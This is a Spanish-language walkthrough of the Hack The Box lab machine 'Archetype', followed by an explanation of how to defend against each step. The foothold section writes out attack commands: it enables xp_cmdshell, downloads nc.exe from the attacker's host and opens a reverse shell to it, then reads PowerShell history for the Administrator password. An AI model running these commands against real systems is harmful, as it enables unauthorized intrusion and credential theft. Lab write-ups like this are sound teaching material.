---
title: Archetype (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, smb, mssql, windows, impacket, rce, privesc, post-explotacion]
type: nota
status: en-progreso
source: claude-code
aliases: [Archetype HTB, archetype starting point, htb archetype]
---

# Archetype — HTB Starting Point (Tier 2)

**Tier 2 · SO: Windows · Dificultad: Very Easy · Skills: SMB enumeration, MSSQL xp_cmdshell RCE, PowerShell history privesc, impacket**

Archetype encadena tres patrones clásicos de Windows: credencial en un fichero de configuración accesible por SMB, ejecución remota de comandos via MSSQL `xp_cmdshell`, y escalada de privilegios leyendo el historial de PowerShell. Es un recorrido completo de compromiso de un servidor Windows real, de acceso anónimo a SYSTEM.

> HTB Starting Point es un laboratorio legal y autorizado por Hack The Box para aprender pentesting de forma ética y controlada.

---

## Objetivo

Obtener acceso como `sql_svc` via MSSQL y escalar a `Administrator` (SYSTEM) usando credenciales filtradas en el historial de PowerShell. Capturar `user.txt` y `root.txt`.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: enumeración de puertos y servicios.**

```bash
nmap -sC -sV -oN archetype.nmap <IP>
```

Puertos relevantes que aparecen:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 445/tcp | SMB (Microsoft-DS) | Compartición de archivos Windows |
| 1433/tcp | MSSQL | Microsoft SQL Server |

El escaneo revela dos superficies de ataque: SMB para buscar shares accesibles y MSSQL como potencial vector de ejecución remota si se obtienen credenciales.

---

## Enumeración

**Categoría: SMB anónimo → fuga de credenciales en fichero de configuración.**

Listar shares sin autenticación:

```bash
smbclient -N -L //<IP>
```

Se descubre el share `backups`. Acceder y descargar su contenido:

```bash
smbclient -N //<IP>/backups
smb: \> ls
smb: \> get prod.dtsConfig
```

`prod.dtsConfig` es un fichero de configuración de SQL Server Integration Services (SSIS). Inspeccionarlo revela una cadena de conexión con credenciales en texto plano:

```xml
<ConfiguredValue>
  Data Source=<IP>;Password=<CONTRASENA_SQL_SVC>;User ID=sql_svc;...
</ConfiguredValue>
```

La credencial encontrada es la del usuario `sql_svc`. El nombre exacto y la contraseña los proporciona el fichero real; no se inventan aquí.

---

## Acceso inicial (foothold)

**Categoría: MSSQL autenticado → habilitación de `xp_cmdshell` → RCE → reverse shell.**

### Paso 1 — Conectar a MSSQL con impacket

```bash
impacket-mssqlclient sql_svc@<IP> -windows-auth
```

### Paso 2 — Habilitar xp_cmdshell

`xp_cmdshell` es un procedimiento almacenado que permite ejecutar comandos del sistema operativo desde SQL Server. Por defecto está deshabilitado; si el usuario tiene permisos `sysadmin` puede reactivarlo:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Verificar que funciona:

```sql
EXEC xp_cmdshell 'whoami';
```

La salida debe mostrar `archetype\sql_svc`.

### Paso 3 — Subir nc.exe y obtener reverse shell

Servir `nc.exe` (netcat para Windows) desde la máquina atacante. La forma más rápida es levantar un servidor HTTP con Python en el directorio donde esté `nc.exe`:

```bash
# En la máquina atacante:
python3 -m http.server 80
```

Descargar `nc.exe` desde MSSQL:

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://<TU_IP>/nc.exe -OutFile C:\Users\sql_svc\Downloads\nc.exe"';
```

Abrir listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Lanzar la reverse shell desde MSSQL:

```sql
EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\nc.exe -e cmd.exe <TU_IP> 4444';
```

Se obtiene una shell como `archetype\sql_svc`.

---

## Escalada de privilegios

**Categoría: post-explotación Windows → historial de PowerShell → credencial de Administrator → impacket-psexec → SYSTEM.**

### Paso 1 — Leer el historial de PowerShell

PowerShell guarda un historial persistente de comandos ejecutados. La ruta estándar en Windows es:

```
C:\Users\<usuario>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Leerlo desde la shell obtenida:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

El fichero contiene comandos ejecutados previamente por `sql_svc`, entre los que aparece la contraseña del `Administrator` en texto plano (por ejemplo, en un `net use` o similar). El valor exacto lo muestra la máquina en vivo.

### Paso 2 — Acceder como Administrator con psexec

```bash
impacket-psexec administrator@<IP>
```

Introducir la contraseña obtenida del historial. Se obtiene una shell como `NT AUTHORITY\SYSTEM`.

---

## Flags

| Flag | Ruta típica en Windows |
|------|------------------------|
| `user.txt` | `C:\Users\sql_svc\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

Leer cada una con `type <ruta>` desde la shell correspondiente. Los valores son `<flag>` (dinámicos por sesión de HTB).

---

## Patron y teoria

**Esta es la sección más importante: los patrones que se repiten y cómo defenderse.**

### Patron 1 — Credencial en fichero de configuración accesible públicamente

**Categoría: information disclosure / misconfigured share.**

El patrón: un share SMB accesible sin autenticación contiene un fichero de configuración (`.dtsConfig`, `.xml`, `.env`, `appsettings.json`, etc.) con credenciales de base de datos en texto plano.

Este patrón aparece constantemente en entornos reales porque los ficheros de config se copian a shares para "facilitar el despliegue". El atacante no necesita explotar nada: la credencial está servida.

**Defensa / diseño:**
- Nunca almacenar credenciales en texto plano en ficheros de configuración versionados o compartidos.
- Usar gestores de secretos (Azure Key Vault, HashiCorp Vault, AWS Secrets Manager) o variables de entorno inyectadas en tiempo de ejecución.
- Restringir acceso a shares SMB: autenticación obligatoria y permisos mínimos (least privilege).
- Auditar shares con `smbclient` o herramientas tipo BloodHound/CrackMapExec en revisiones de seguridad internas.

### Patron 2 — MSSQL xp_cmdshell como vector de RCE

**Categoría: database feature abuse / RCE via stored procedure.**

El patrón: `xp_cmdshell` convierte SQL Server en un ejecutor de comandos del sistema operativo. Si un atacante tiene credenciales con permisos `sysadmin` (o puede elevarlos), tiene ejecución de código como el usuario del servicio SQL.

`xp_cmdshell` está deshabilitado por defecto desde SQL Server 2005, pero muchas instalaciones lo reactivan por comodidad operacional o por scripts legacy.

**Defensa / diseño:**
- Mantener `xp_cmdshell` deshabilitado. Configurar una alerta si alguien lo habilita (DDL trigger o auditoría de SQL Server).
- El usuario del servicio MSSQL no debe tener permisos de escritura en directorios del sistema.
- Principio de mínimo privilegio en cuentas de base de datos: las cuentas de aplicación no necesitan `sysadmin`.
- Monitorizar `sp_configure` y `RECONFIGURE` en logs de auditoría de SQL Server.

### Patron 3 — Historial de PowerShell como vector de exfiltración de credenciales

**Categoría: credential exposure / post-explotación Windows.**

El patrón: los administradores de Windows usan PowerShell para tareas de mantenimiento y a veces pasan credenciales como argumentos en línea (por ejemplo, `net use \\\server\share /user:Administrator <contrasena>`). PSReadLine guarda ese historial en disco de forma persistente y legible por el propio usuario.

Un atacante con acceso a la cuenta de servicio puede leer el historial del perfil y encontrar credenciales de cuentas con más privilegios.

**Defensa / diseño:**
- Nunca pasar contraseñas como argumentos en línea de comandos. Usar `Get-Credential`, `SecureString` o secretos gestionados.
- Limpiar o deshabilitar el historial de PSReadLine en entornos de producción: `Set-PSReadLineOption -HistorySaveStyle SaveNothing`.
- Tratar el historial de PowerShell como un artefacto forense: incluirlo en revisiones de incidentes y en checklists de hardening.
- Separar cuentas de servicio de cuentas administrativas: que `sql_svc` no tenga en su perfil credenciales de `Administrator`.

### Vision global — cadena de ataque

```
SMB anónimo
  → fichero .dtsConfig con credencial sql_svc en claro
    → MSSQL autenticado + xp_cmdshell habilitado
      → RCE como sql_svc
        → historial PowerShell con credencial Administrator
          → psexec → SYSTEM
```

Cada eslabón es evitable de forma independiente. La defensa en profundidad implica que romper uno solo de los eslabones detiene el ataque completo.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[06-seguridad-de-sistemas-y-hardening]]
